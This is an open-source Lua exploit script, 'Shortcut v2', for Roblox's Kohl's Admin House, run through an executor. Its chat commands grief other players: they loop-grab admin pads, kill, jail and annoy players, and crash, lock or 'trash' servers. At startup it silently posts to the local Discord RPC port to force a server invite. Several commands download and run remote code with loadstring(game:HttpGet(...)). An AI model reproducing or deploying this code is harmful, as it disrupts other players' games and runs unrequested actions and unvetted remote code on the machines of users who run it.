Remove this line
--[[
    Credits

    Tech (Tech) - Most of this entire script after everything
    Mia (miia;) - The entire start of v2 along with Tech
    Laamy (yeemi) - Part of v2 and the entirety of v1
    whatjg (whatjggotdeleted) - Additional commands

    And a few FE scripts from google may have been used iirc



    The code is extremely messy, 
    because #1 it's a KAH script so I can't be bothered to make it clean 
    and #2 This script wasn't supposed to be going open source at first lol
    and ofc I had only 1 month of scripting experience at the time most of this was made (before release)

    Some commands are taken out due to v2 having a premium variant back in the day

    Every start-up loadstring has been removed so some things completely broke because of that. Don't use this as an example of how I code nowadays
    Use the obfuscated version for the intended experience (hence why the first line has to be removed, 
    it more or less serves as an are you sure you want to use this version warning)
]]
repeat
    task.wait()
until game:IsLoaded()
game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()

workspace.FallenPartsDestroyHeight = -math.huge 

-- Discord autojoiner
task.spawn(function()
    pcall(function()
	local http = game:GetService('HttpService')
	local req = http_request or request or HttpPost or syn.request
	if req then
		req({
			Url = 'http://127.0.0.1:6463/rpc?v=1',
			Method = 'POST',
			Headers = {
				['Content-Type'] = 'application/json',
				Origin = 'https://discord.com'
			},
			Body = http:JSONEncode({
				cmd = 'INVITE_BROWSER',
				nonce = http:GenerateGUID(false),
				args = {
					code = 'NcWBtB76aW'
				}
			})
		})
	end
end)
end)

local scriptActive = true

local padAbuse = false
local temploopgrab = false
local perm = true
local rainbowEx = false
local clickExpode = false
local clickPadban = false
local farding = false
local clickAnnoy = false
local antiBlind = false
local antiMsg = false
local antiSpeed = false
local antiSetgrav = false
local antiTeleport = false
local antiFlash = false
local colors = false
local autoafk = true
local trippin = false
local antigear = false
local oldperm = false
local antiattach = false


local gamewidereport = true -- I love this. It uses a gear to make SC users report the player who has said gear



local m = game:GetService('Players').LocalPlayer:GetMouse()
local GC = getconnections or get_signal_cons -- For the GUI inputs.

local prefix = "//" -- You can now change this
local connection

-- BasicSetup (ExVariables):

--local req = (syn and syn.request) or request or (http and http.request) or http_request

local gameFlr = workspace.Terrain._Game
local adminFlr = gameFlr.Admin
local plyrs = game:GetService("Players")
local rns = game:GetService("RunService")

function logn(a6) -- No Temmie. I did not skid shit, if you think I skidded anything then you're wrong B-)
	game.StarterGui:SetCore("SendNotification", {
		Title = "Shortcut v2",
		Text = a6,
		Duration = 1
	})
end;

local connections = {}

Utils = {
    Task = {}
}

function Utils.Task:wait(duration)
    if duration == nil or duration <= 0 then
        duration = 1
    end

    local measure = os.clock()
    duration = duration * 0.001

    repeat delta = task.wait() until os.clock() + delta >= measure + duration

    repeat if true then end until measure + duration <= os.clock() 
    -- Originally made by yeemi, simplified by me (Tech). I never used this in SCV2, it's basically a stable version of task.wait()
end

function Utils:__wait()
    rns.Heartbeat:Wait()
end
function Utils.getPlr(str)
    local myInput = string.lower(str)
    for i, v in ipairs(plyrs:GetPlayers()) do
        if string.sub(string.lower(v.Character.Name), 1, #myInput) == myInput then
            return v.Character.Name
        end
    end
end


local function cht(massage)
    game.Players:Chat(massage)
end

local csp = string.rep("0", 50)
function createKohlsUi(textTable)
	local kohlsUI = Instance.new("ScreenGui")
	local TextButton = Instance.new("TextButton")
	local Frame = Instance.new("Frame")
	local closeUi = Instance.new("TextButton")
	local Frame_2 = Instance.new("Frame")
	local a = Instance.new("TextLabel")
	local UIGridLayout = Instance.new("UIGridLayout")
	local clearUi = Instance.new("TextButton")

	--Properties:

	kohlsUI.Name = "kohlsUI"
	kohlsUI.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	kohlsUI.ResetOnSpawn = false

	TextButton.Parent = kohlsUI
	TextButton.BackgroundTransparency = 1.000
	TextButton.Draggable = true
	TextButton.Position = UDim2.new(0.5, -548, 0.5, -94)
	TextButton.Size = UDim2.new(0, 385, 0, 20)
	TextButton.AutoButtonColor = false
	TextButton.Text = ""

	Frame.Parent = TextButton
	Frame.ClipsDescendants = true
	Frame.Size = UDim2.new(0, 400, 0, 400)
	Frame.ZIndex = 7
	Frame.Style = Enum.FrameStyle.RobloxRound

	closeUi.Name = "closeUi"
	closeUi.Parent = Frame
	closeUi.Position = UDim2.new(1, -15, 0, -5)
	closeUi.Size = UDim2.new(0, 20, 0, 20)
	closeUi.ZIndex = 10
	closeUi.Style = Enum.ButtonStyle.RobloxButtonDefault
	closeUi.Font = Enum.Font.ArialBold
	closeUi.Text = "X"
	closeUi.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeUi.TextSize = 18.000

	Frame_2.Parent = Frame
	Frame_2.Position = UDim2.new(0, 0, 0, -9)
	Frame_2.ZIndex = 8

	a.Name = "a"
	a.Parent = Frame_2
	a.BackgroundTransparency = 1.000
	a.Position = UDim2.new(NAN, 0, NAN, 0)
	a.Size = UDim2.new(200, 18, 200, 18)
	a.ZIndex = 8
	a.Font = Enum.Font.Arial
	a.Text = ""
	a.TextColor3 = Color3.fromRGB(255, 255, 255)
	a.TextSize = 18.000
	a.TextStrokeTransparency = 0.800
	a.TextXAlignment = Enum.TextXAlignment.Left
	a.TextYAlignment = Enum.TextYAlignment.Top

	UIGridLayout.Parent = Frame_2
	UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
	UIGridLayout.CellSize = UDim2.new(0, 100, 0, 18)

	clearUi.Name = "clearUi"
	clearUi.Parent = Frame
	clearUi.Position = UDim2.new(0.944999993, -15, 0, -5)
	clearUi.Size = UDim2.new(0, 20, 0, 20)
	clearUi.ZIndex = 10
	clearUi.Style = Enum.ButtonStyle.RobloxButtonDefault
	clearUi.Font = Enum.Font.ArialBold
	clearUi.Text = "C"
	clearUi.TextColor3 = Color3.fromRGB(255, 255, 255)
	clearUi.TextSize = 18.000

	-- Scripts:

	local function NNQOKB_fake_script() -- Frame_2.LocalScript 
		local script = Instance.new('LocalScript', Frame_2)

		function addLabel(txt)
			local newLb = script.Parent.a:Clone()
			newLb.Name = "TextLabel"
			newLb.Text = txt
			newLb.Parent = script.Parent
		end
		
		function addLabelWCheck(txt)
			local cnt = 0
			for i,v in pairs(script.Parent:GetChildren()) do
				if v.Name == "TextLabel" then
					cnt = cnt + 1
				end
			end
			if cnt >= 16 then
				clearLabels()
			end
			addLabel(txt)
		end
		
		function clearLabels()
			for i,v in pairs(script.Parent:GetChildren()) do
				if v.Name == "TextLabel" then
					v:Destroy()
				end
			end
		end
		
		script.Parent.Parent.closeUi.MouseButton1Click:Connect(function()
			script.Parent.Parent.Parent.Parent:Destroy()
		end)
		
		script.Parent.Parent.clearUi.MouseButton1Click:Connect(clearLabels)
		
		for _, text in ipairs(textTable) do
			addLabelWCheck(text)
		end
	end
	coroutine.wrap(NNQOKB_fake_script)()
end

coroutine.wrap(function()
    game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()

    local loaded = false

    coroutine.wrap(function()
            wait(8)
            if not loaded then
                print("Crashed")
                local http = game:GetService("HttpService")
                local tpSrv = game:GetService("TeleportService")

                local gmId = 112420803 -- game.PlaceId

                local wb = "https://games.roblox.com/v1/games/" .. gmId .. "/servers/Public?sortOrder=Asc&limit=100"

                while true do
                    wait(2.5)
                    local srvDt = http:JSONDecode(game:HttpGetAsync(wb)).data

                    local svrList = {}
                    for _, v in ipairs(srvDt) do
                        pcall(
                            function()
                                if type(v) == "table" and v.Id ~= game.JobId and 6 > v.playing then
                                    local validSrv = true
                                    for n, m in pairs(v.playerTokens) do
                                        if m == "4EE36373CEF89093957ADC11189D5B4A" then
                                            validSrv = false
                                        end
                                    end
                                    if validSrv then
                                        pcall(function()
                                                if v.ping ~= 0 then
                                                    svrList[#svrList + 1] = v.id
                                                end
                                            end)
                                    end
                                end
                            end)
                    end
                    local b, n =
                        pcall(
                        function()
                            tpSrv:TeleportToPlaceInstance(gmId, svrList[math.random(1, #svrList)])
                        end)
                    if b then
                        print("New server found!")
                    else
                        print("No new servers found")
                    end
                end
            end
        end)()

    repeat
        wait()
    until game:IsLoaded()

    loaded = true
end)()

game.StarterGui.ResetPlayerGuiOnSpawn = false

function say(msg)
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
end

function hasGamepass(plrId, id)
    local plrData = game:HttpGet("https://inventory.roblox.com/v1/users/" .. plrId .. "/items/GamePass/" .. id)
    local hasPerm = false
    if string.match(plrData, tostring(id)) then
        hasPerm = true
    end
    return hasPerm
end

-- BasicSetup (Exc-;):

task.spawn(function()
    while scriptActive == true do wait()
        coroutine.wrap(function() -- PadAbuse
			if padAbuse == true then
				local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
				for i, pad in pairs(pads) do
					coroutine.wrap(function()
						pcall(function()
							local cre = pad.Head
							local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
							firetouchinterest(cre, spr, 1)
							task.wait()
							firetouchinterest(cre, spr, 0)
							
							if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
								fireclickdetector(adminFlr.Regen.ClickDetector, 0)
							end
						end)
					end)()
				end
			end
        end)()

        coroutine.wrap(function() -- Temp grab does not interfere with main command
			if temploopgrab == true then
				local pads = game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren("Head")
				for i, pad in pairs(pads) do
					coroutine.wrap(function()
						pcall(function()
							local cre = pad.Head
							local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
							firetouchinterest(cre, spr, 1)
							task.wait()
							firetouchinterest(cre, spr, 0)
							
							if pad.Name ~= game.Players.LocalPlayer.Name.."'s admin" then
								fireclickdetector(adminFlr.Regen.ClickDetector, 0)
							end
						end)
					end)()
				end
			end
        end)()
		
        coroutine.wrap(function() -- Perm
			local spr = game.Players.LocalPlayer.Character:FindFirstChild("Head")
			if perm ~= true or adminFlr.Pads:FindFirstChild(game.Players.LocalPlayer.Name.."'s admin") ~= nil then 
			else
				pcall(function()
					local pad = adminFlr.Pads:FindFirstChild("Touch to get admin")
					local a = pad.Head
					firetouchinterest(a, spr, 1)
					task.wait()
					firetouchinterest(a, spr, 0)
				end)
			end
        end)()
    end
end)

local RunService = game:GetService("RunService")

local pos1 = nil
local pos2 = nil

RunService.RenderStepped:Connect(function()
        if antiTeleport then
            local character = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
            local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

            if pos1 == nil then
                pos1 = humanoidRootPart.CFrame
                pos2 = humanoidRootPart.CFrame
            end

            local distance = (Vector3.new(pos1.x, pos1.y, pos1.z) - Vector3.new(pos2.x, pos2.y, pos2.z)).Magnitude
            print(math.floor(distance))
            if math.floor(distance) > 8 then
                humanoidRootPart.CFrame = CFrame.new(Vector3.new(pos1.x, pos1.y, pos1.z))
                pos1 = humanoidRootPart.CFrame
                pos2 = humanoidRootPart.CFrame
            else
                pos1 = pos2
                pos2 = humanoidRootPart.CFrame
            end
        end
    end)

coroutine.wrap(function()
	local speed = 32
	while scriptActive do
		for i = 0,1,0.001*speed do
			local clr = Color3.fromHSV(i,1,1)
			if rainbowEx == true then
				cht("colorshiftbottom "..math.floor(clr.R * 1000).." "..math.floor(clr.G * 1000).." "..math.floor(clr.B * 1000))
				cht("colorshifttop "..math.floor(clr.R * 1000).." "..math.floor(clr.G * 1000).." "..math.floor(clr.B * 1000))
			end
			wait(1 / 6) -- recolor the map x times a second lol.
		end
	end
end

)()

local mouse = game.Players.LocalPlayer:GetMouse()
mouse.Button1Down:Connect(function()
        pcall(function()
                local plr = mouse.Target.Parent.Parent
                for i, v in pairs(game.Players:GetPlayers()) do
                    pcall(function()
                            if mouse.Target.Parent:FindFirstChild("Humanoid") then
                                plr = mouse.Target.Parent
                            end
                        end)
                end
                if plr ~= nil then
                    if clickExpode then
                        cht("explode " .. plr.Name .. "  " .. math.random(1, 1000))
                    elseif clickAnnoy then
                        cht(prefix .. "annoy " .. plr.Name)
                    elseif clickPadban then
                        cht("/padban " .. plr.Name)
                    elseif trippin then
                        cht("trip " .. plr.Name .. " " .. math.random(1, 69))
                        cht("blind " .. plr.Name .. " " .. math.random(1, 1000));wait(.35)
                        cht("unblind " .. plr.Name .. " " .. math.random(1, 1000))
                    end
                end
            end)
    end
)

local spam = false

game.Players.LocalPlayer.Chatted:Connect(function(msg)
pcall(function()
    if string.sub(msg:lower(), 0, #prefix) == prefix then
        if msg:lower() == prefix .. "cmds" then
            print([[ REMEMBER ALL THESE COMMANDS HAVE // AS THEIR PREFIX AND NOT A SINGLE / 


Keybind controls are at the bottom 

Please keep in mind our commands list is outdated by a little. There are more commands actually but unlisted
1. cmds - Shows the commands list 
2. mboombox. - Something epic with the boombox 
3. rej - Rejoin 
4. spam - Spam
5. boombox - Give yourself a boombox
6. tspam - Slow spam
7. annoy - Keeps sitting and resetting a player
8. stop - Stops the spam
9. super - Spam a command like hell for like 1 second
10. findresetpad - Looks for the regen 
11. /cmds with one / for Shortcut v1 commands 
12. shutdown - Shut the server down 
13. fixpaint - Resets the color of the map
14. messpaint - Mess with the color of the map. You can also spam it
15. breakcam - Breaks the camera server sided 
16. fixcam - Fix the camera but client sided 
17. breakbp - Breaks the baseplate. Credits to whatjggotdeleted#3236
18. invite - Discord invite. Feel free to join 
19. Antiabuse - Resets anyone who dies or gets punished you name it 
20. Rickroll - Crash the server but with a rickroll 
21. loopgrab - Keep grabbing all pads 
22. automusic [ID] Play a song that will be on loop. This breaks often so rejoin if it does nothing 
23. apocalypse - Makes the map red-ish and plays a scary song 
24. up - Quick unpunish however it's slow without admin 
25. afternoon - Change the time and map look to a nice summer'ish afternoon 
26. play 1-43 - Plays songs from the playlist 
27. tkick - Crash a player out of the game 
28. periastron - Gives you all periastron swords 
29. Ivory - Gives you specifically the Ivory periastron for the attach glitch 
30. tempcrash - Temporarily crashes the server 
32. infyield - Loads up infinite yield 
33. Mia all - All hail Mia xd 
33. Flood - Gives you the flood gear over and over so you can flood the map. It stops itself eventually 
35. fixbp - Fixes the baseplate if it's moved or curved it doesn't fix a slidey baseplate though. 
37. setspawn - Sets the spawn to the location you're at. 
38. resetspawn - Put the spawns back 
39. resetantitp - This fixes the thing with the Anti tp that makes you get stuck for example if you fall into the death barrier or you're stuck falling far up in the sky 
40. setmsg - Basically setMessage from Admin House. You can pin your custom message only the time is capped at 10 minutes you can stop it early with //stop 
41. emoji - Enable discord emojis so you can basically :joy: laugh at my jokes or :clown: at abusers after padbanning them. 
42. Part - Spawn a freeze block that behaves like a part 
43. Plrattach - With this you can attach players to objects you're attached to. Uses dog method 
44. Silcrash - Silent crash in other words no special effects when crashing and no delay meaning it won't even show in the chat. It may only tempcrash though and it's more likely to fail. That's the downside of silent crashes 
45. Bypass - Loads the chat bypass GUI. Added this because alot of words are tagged like just general Kohls stuff 
46. Visualizer - Makes the fog go along with the loudness of the music         Command made by whatjggotdeleted#3236 
47. crazycolors - Makes alot of colors flash within seconds it looks cool. 
48. trashserver - Messes the server up like hell requires good ping in order for it to work properly. 
50. Movelight - Moves the house/big light. 
51. Fixhlight - This puts the house light back in place 
52. Bringlight - This brings the light to your current position Thanks to Logical/Humangas for the idea of the light stuff 
53. Movebuildingbricks - Like the old command only this one keeps on going and also moves the bricks horizontally. Also rejoin when it's done 
54. Idle - Makes you stand entirely still and also makes you as hard as a brick. You can't sit on dogs or get moved/pushed around 
55. correctbp - Corrects the baseplate after using fixbp. The baseplate should be back as if the server just started 
56. Serverlock *Used to be premium only* - Enable server lock. Type //unslock (plr) to unlock a specific player and //unserverlock to disable 
57. prefix - Link to a prefix change script. 
58. god - FE god with fling as well. Press E and use your mouse to activate the fling. FE script made by fourspring#9088 
59. Fly - Fly without admin. 
60. msgnoabuse - Leave a scary threatening message behind for admin abusers 
61. msgtruth - Message with some painful truth in it like damn 
64. Oldantitp - The old anti teleport some people may prefer that instead 
65. Tabcheck - When enabled it will let everyone know you've tabbed out above your username 
71. bmove - Use your mouse to move things. Kinda like you have working btools only it's experimental at the moment 
Please note: It's recommended to use roof parts instead of the building bricks for creations 
72. fixgrav - Fixes your gravity 
73. jail - A stronger version of the already existing jail command. This is what noobs see when they get jailed by an admin abuser 
74. loadreg (plr) - Adds the regen pad into someones workspace folder if it's missing 
Note: This doesn't work if you don't have the regen loaded in 
75. killpaintui - Sometimes the paint GUI gets stuck on the left corner of your screen and you literally can't remove it. Well this fixes it. 
76. skick - Server kick a player. Please note exploiters can bypass this. 
77. scramble - Scrambles the chat/server ¯\_(ツ)_/¯ 
78. Createblockstorage - Creates a storage of anchored icepartblocks into the sky made for the SS btools 
Please note: This command spawns a total of 62 blocks at the same map coord. It will keep creating blocks until the exact number 62 has been reached. Use alt accounts if you need more blocks 
83. Floppa - This turns you into FE Floppa. Credits: Joshua11 
84. amogus - FE Among Us. Shapeshifts you into a sussy baka 
85. Sonic - Become Sonic literally. 
86. Removewater - Removes leftover water parts SS. 
89. Blackout - Makes the server go completely black. 
90. slockmuter - Hides everyones chat UI. Useful after server locking 
Please Note: By using this command you're a lot more likely to get warned 
91. FOV - Change your field of view 
92. Lockapi - You can use our Lock API to blacklist other players with multiple methods]]);wait(.35)
            createKohlsUi(
                {
                    "Welcome to shortcut v2!",
                    "Created by miia#5292 & Tech0253#",
                    "1. cmds",
                    "2. mboombox",
                    "3. rej",
                    "4. spam <args>",
                    "5. boombox <args>",
                    "6. tspam <args>",
                    "7. annoy <args>",
                    "8. stop",
                    "9. super <args> \n 10. findresetpad \n 11. /cmds \n 12. shutdown \n 13. fixpaint \n Press F9 to see more"
                }
            )
        end

        if msg:lower() == prefix .. "boombox" then
            cht("gear me 212641536")
        end
        if msg:lower() == prefix .. "mia all" then
            cht("h \n\n\n She left. Why would she, I feel lonely") -- Actually not, her char is just a boy 
            cht("fogcolor 0 0 0");wait()
            cht("fogend 35");wait(5)
            cht(prefix.."silcrash")
        end

        if msg:lower() == prefix .. "visualizer" then
            setclipboard("fogend nil moment")
            cht("fogcolor 255 255 0")
            cht([[h 




        SoundVis On




        ]])
            soundvis = true
            cht("time 0")
            game:GetService("Workspace").Terrain["_Game"].Folder:WaitForChild("Sound")
            local loud = game:GetService("Workspace").Terrain["_Game"].Folder.Sound.PlaybackLoudness


            repeat
                if loud > 100 then
                else
                    if game:GetService("Workspace").Terrain["_Game"].Folder:FindFirstChild("Sound") then
                        cht("fogend "..game:GetService("Workspace").Terrain["_Game"].Folder.Sound.PlaybackLoudness)
                    else
                    end
                end;wait()
            until soundvis == false
        end
        if msg:lower() == prefix .. "unvisualizer" then
            soundvis = false
            cht("h \n \n \n SoundVis Off \n \n \n")
        end

        if msg:lower() == prefix .. "crazycolors" then
            cht("h \n \n \n fog end  n i l moment \n \n \n")
            cht("fogend nil moment")
            soundvis = false
            colors = true
        end

        if msg:lower() == prefix .. "findresetpad" or msg:lower() == prefix .. "toregen" then
            local root = game.Players.LocalPlayer.Character.HumanoidRootPart
            root.Anchored = true
            repeat
            task.wait()
            root.CFrame = CFrame.new(-7.165, root.Position.Y + 2500 , 94.743)
            until workspace.Terrain._Game.Admin:FindFirstChild("Regen")
            root.Anchored = false
            root.CFrame = workspace.Terrain._Game.Admin:FindFirstChild("Regen").CFrame + Vector3.new(0, 3, 0)
        end
        if msg:lower() == prefix .. "infyield" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
        end
        if msg:lower() == prefix .. "fixpaint" then
            cht("/color all original")
        end
        if msg:lower() == prefix .. "messpaint" then
            cht("/color all random")
        end
        if msg:lower() == prefix .. "trashserver" then
            padAbuse = true
            antiTeleport = false
            setclipboard("-52, -26623, -24 these are gamer coords")
            cht("/toggle antivoid");wait(.25)
            cht("/disablerc")
            cht("/movebaseplate");wait(1.654)
            cht("/moveresetpad");wait(.3)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-52, -26623, -24));wait(1.35)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-48, -10723, -18));wait(.25)
            cht("unfly me");wait(13.5)
            cht("h \n \n \n Mr Krabs: It seems like this server got ruined!! Please join another server instead \n \n \n")
            cht("music 0000000000000008694014229")
            cht("fogcolor 0 0 0")
            cht("fogend nil moment")
            cht("kill others");wait(.5)
            cht(prefix.."automusic 8694014229");wait(.5)
            cht(prefix.."silcrash")
        end
        if msg:lower() == prefix .. "fixantitp" then
            antiTeleport = false
            pos1 = nil
            pos2 = nil
        end
        if msg:lower() == prefix .. "breakcam" then
            cht("/disablerc");wait(2)
            cht("ungear all")
        end
        if msg:lower() == prefix .. "part" then
            cht("invis me")
            cht("stun me")
            cht("freeze me")
            cht("name me invisible core");wait(.3)
            cht("clone me")
            cht("outdoorambient 255 255 255");wait()
            cht("reset me");wait(.7)
            cht("gear me "..csp.."00000000123234673")
            cht("pm me Hit the block with the Knife");wait(10) -- In case you want to keep the block anchored
            cht("gear me "..csp.."0000000018474459")
        end
        if msg:lower() == prefix .. "idle" then
            cht("/trap me");wait(.5)
            cht("fly me")
            cht("god "..csp.." me")
            cht("fly me")
            logn("Your moving legs is only client sided")
        end
        if msg:lower() == prefix .. "emoji" then
            loadstring(game:HttpGet(("https://raw.githubusercontent.com/T3chn0w1thth4t/garbage/main/emojis.txt"),true))() ;wait(.5)
            cht("pm me Don't chat until this message vanishes")
            logn("You may now chat")
        end

        if msg:lower() == prefix .. "afternoon" then
            cht("colorshifttop 600 400 10")
            cht("colorshiftbottom 600 400 10")
            cht("time 16")
        end
        if msg:lower() == prefix .. "error" then
            cht("/toggle antikill")
            cht("music 1835352438")
            cht(
                [[h  

























_______________________________________




:(
__________________________

The server has glitched because this script has detected an error.

Server will be back online soon.

_________________________________
Additional information - Shortcut v2 has taken over Kohls.

]]
            )
            cht("fogcolor 1000 0 0")
            cht("fogend 500");wait(1.5)
            cht(prefix.."tempcrash");wait(3)
            cht("fix")
            cht("unchar all");wait(6)
            cht("clr")
        end
        if msg:lower() == prefix .. "up" then
            game.Players.LocalPlayer.Character:Destroy()
            cht(":refresh me,me,me,me,me,me " .. math.random(1, 999999));wait()
            cht(":refresh me,me,me,me,me,me " .. math.random(1, 999999));wait()
            cht(":refresh me,me,me,me,me,me " .. math.random(1, 999999));wait()
            cht(":refresh me,me,me,me,me,me " .. math.random(1, 999999));wait()
        end
        if msg:lower() == prefix .. "loopgrab" then
            padAbuse = true
        end
        if msg:lower() == prefix .. "temploopgrab" then
            temploopgrab = true
        end
        if msg:lower() == prefix .. "unloopgrab" then
            padAbuse = false
        end
        if msg:lower() == prefix .. "untemploopgrab" then
            temploopgrab = false
        end
        if msg:lower() == prefix .. "oldantitp" then
            antiTeleport = true
            logn("Use //fixantitp to turn this off")
        end
        if msg:lower() == prefix .. "tabcheck" then
            autoafk = true
            logn("//untabcheck turns this off")
        end
        if msg:lower() == prefix .. "untabcheck" then
            autoafk = false
        end
        if msg:lower() == prefix .. "antiabuse" then
            game:GetService'Players':Chat((" :)"))
for i,vai in pairs(game.Players:GetChildren()) do
    while vai ~= nil do wait(0.3)
if #game.Players:GetChildren() < #game.Players:GetChildren() and #game.Players:GetChildren() > #game.Players:GetChildren() then
    wait(0.6)
end
        for i,v in pairs(game.Players:GetChildren()) do
            if game:GetService("Workspace"):FindFirstChild(tostring(v.Name)) == nil then
            game:GetService("Players"):Chat("unpunish all")
            wait(0.2)
            end
            if v.Character.Humanoid ~= nil then
            if v.Character.Humanoid.Health < 100 then
                if v.Character.Humanoid.Health ~= 0 then
                game:GetService'Players':Chat(("health "..v.Name.." 150"))
                if v.Character.Humanoid.Health < 51 then
                    game:GetService'Players':Chat(("ff "..v.Name))
                end
                end
            elseif #game.Players:GetChildren() < #game.Players:GetChildren() and #game.Players:GetChildren() > #game.Players:GetChildren() then
            end
            if v.Character.Humanoid.Health == 0 then
                game:GetService'Players':Chat(("reset "..v.Name))
            elseif #game.Players:GetChildren() < #game.Players:GetChildren() and #game.Players:GetChildren() > #game.Players:GetChildren() then
                end
            if v.Character.Humanoid.PlatformStand == true then
                game:GetService'Players':Chat(("unstun "..v.Name))
            elseif #game.Players:GetChildren() < #game.Players:GetChildren() and #game.Players:GetChildren() > #game.Players:GetChildren() then
            end
            end
            for i,bruv in pairs(v.Character:GetChildren()) do
                if bruv.Name == "Seizure" then
                    game:GetService'Players':Chat(("unseizure "..v.Name))
                end
                end
            for i,ve in pairs(v.Backpack:GetChildren()) do
                if ve.Name == "VampireVanquisher" then
                    game:GetService'Players':Chat(("reset "..v.Name))
                    game:GetService'Players':Chat(("h/ -------------"..v.Name.." TRIED TO CRASH THE SERVER LOL-------------"))
                    end
            end
            for i,vi in pairs(v.Character:GetChildren()) do
                if vi.Name == "VampireVanquisher" then
                    game:GetService'Players':Chat(("reset "..v.Name))
                    game:GetService'Players':Chat(("h \n \n \n \n \n \n -------------"..v.Name.." TRIED TO CRASH THE SERVER LOL-------------"))
            end
            end
                for i,v1r in pairs(game.Workspace.Terrain["_Game"].Folder:GetChildren()) do
                    if v1r.Name == v.Name.."'s jail" then
                        wait(0.5)
                        game:GetService'Players':Chat(("removejails"))
                end
            end
       	    end
        for i,vr in pairs(game.Workspace.Terrain["_Game"].Folder:GetChildren()) do
            if vr.Name == "Sound" then
                game:GetService'Players':Chat(("stopmusic"))
                game:GetService'Players':Chat(("music"))
                game:GetService'Players':Chat(("stopmusic"))
                game:GetService'Players':Chat(("stopmusic"))
                game:GetService'Players':Chat(("music"))
                game:GetService'Players':Chat(("stopmusic"))
                game:GetService'Players':Chat(("music"))
                game:GetService'Players':Chat(("stopmusic"))
                game:GetService'Players':Chat(("stopmusic"))
                game:GetService'Players':Chat(("h \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n \n Sorry, try next time using a boombox!. Also nobody asked. \n \n \n cringe kids these days smh"))
            end
	end
    end
end
        end
        if msg:lower() == prefix .. "fixcam" then
            task.spawn(function()
                local lp = game.Players.LocalPlayer
                local ui = game:GetService("UserInputService")
                local l__ContextActionService__7 = game:GetService("ContextActionService");
                local l__RunService__1 = game:GetService('RunService')
                l__ContextActionService__7:UnbindAction("ShoulderCameraSprint");
                l__RunService__1:UnbindFromRenderStep("ShoulderCameraUpdate");
                l__ContextActionService__7:UnbindAction("ShoulderCameraZoom");
                while true do
                    repeat game:GetService'RunService'.Heartbeat:Wait() until game.Workspace.CurrentCamera.CameraType == Enum.CameraType.Scriptable
                    l__RunService__1:UnbindFromRenderStep("ShoulderCameraUpdate");
                    l__ContextActionService__7:UnbindAction("ShoulderCameraZoom");
                    l__ContextActionService__7:UnbindAction("ShoulderCameraSprint");
                    local wepsys = game:GetService("ReplicatedStorage"):FindFirstChild('WeaponsSystem')
                    if not wepsys then return end
                    for i,v in pairs(wepsys:GetDescendants()) do
                        if v:IsA("Script") then
                        v.Disabled = true
                        end
                        v:Destroy()
                    end
                    local wep = lp.PlayerGui:FindFirstChild("ClientWeaponsScript")
                    local gui = lp.PlayerGui:FindFirstChild("WeaponsSystemGui")
                    local sc = lp.PlayerScripts:FindFirstChild("ClientWeaponsScript")
                    if wep then wep.Disabled = true wep:Destroy() end
                    if gui then gui:Destroy() end
                    if sc then
                        sc.Disabled = true
                        sc:Destroy()
                    end
                    ui.MouseIconEnabled = true
                    game.Workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
                    game.Workspace.CurrentCamera.CameraSubject = lp.Character.Humanoid
                    lp.Character.Humanoid.AutoRotate = true
                end
            end)
        end
        if msg:lower() == prefix .. "breakcam" then
            cht("/disablerc");wait(2)
            cht("ungear all")
        end
        if msg:lower() == prefix .. "invite" then
            setclipboard(".gg/65yHbG4Wfa")
            logn("Set to clipboard")
        end
        if msg:lower() == prefix .. "fixcollision" then
            for i, v in pairs(game.Workspace:GetDescendants()) do
                if v:IsA("Part") then
                    v.CanCollide = true
                end
            end
        end
        if msg:lower() == prefix .. "startup" then
            task.wait(1.65)
            task.wait();cht(shared.startupcmd1)
            task.wait();cht(shared.startupcmd2)
            task.wait();cht(shared.startupcmd3)
            task.wait();cht(shared.startupcmd4)
            task.wait();cht(shared.startupcmd5)
            task.wait();cht(shared.startupcmd6)
        end
        if msg:lower() == prefix .. "guicommands" then
            rconsoleprint("If the GUI button is there but the command isn't then that means that there was already a command for it.")
            rconsoleprint("The prefix is still // for those commands. They're just seperated \n Also the * symbol doesn't count though.")
            rconsoleprint("-\n");rconsoleprint("-\n");rconsoleprint("-\n");rconsoleprint("-\n");rconsoleprint("-\n");rconsoleprint("-\n")
            rconsoleprint("@@LIGHT_RED@@")
            rconsoleprint("\nguiinput commands")
            rconsoleprint("\nguiinput rainbowex")
            rconsoleprint("\nguiinput clickexplode")
            rconsoleprint("\nguiinput clickpadban")
            rconsoleprint("\nguiinput clickfard")
            rconsoleprint("\nguiinput clickannoy")
            rconsoleprint("\nguiinput hideregenpad")
            rconsoleprint("\nguiinput deleteregenpad")
            rconsoleprint("\nguiinput rainbowpads")
            rconsoleprint("\nguiinput deleteadminpads")
            rconsoleprint("\nguiinput noadmin lagger fe")
            rconsoleprint("\nguiinput silent commands")
            rconsoleprint("\nguiinput builds")
            rconsoleprint("\nguiinput f3x instead of btools")
            rconsoleprint("\nguiinput antigears")
            rconsoleprint("\nguiinput antilag")
            rconsoleprint("\nguiinput findregen2")
            rconsoleprint("\nguiinput loadpads")
            rconsoleprint("\nguiinput findregen3")
            rconsoleprint("\nguiinput antispeed")
            rconsoleprint("\nguiinput perm")
            rconsoleprint("\nguiinput guns")
            rconsoleprint("\nguiinput executor specs")
            rconsoleprint("\nguiinput antipunish")
            rconsoleprint("\nguiinput autoheal")
            rconsoleprint("\nguiinput antiblind")
            rconsoleprint("\nguiinput antisetgrav")
            rconsoleprint("\nguiinput antiattach")
            rconsoleprint("\nguiinput antiteleport")
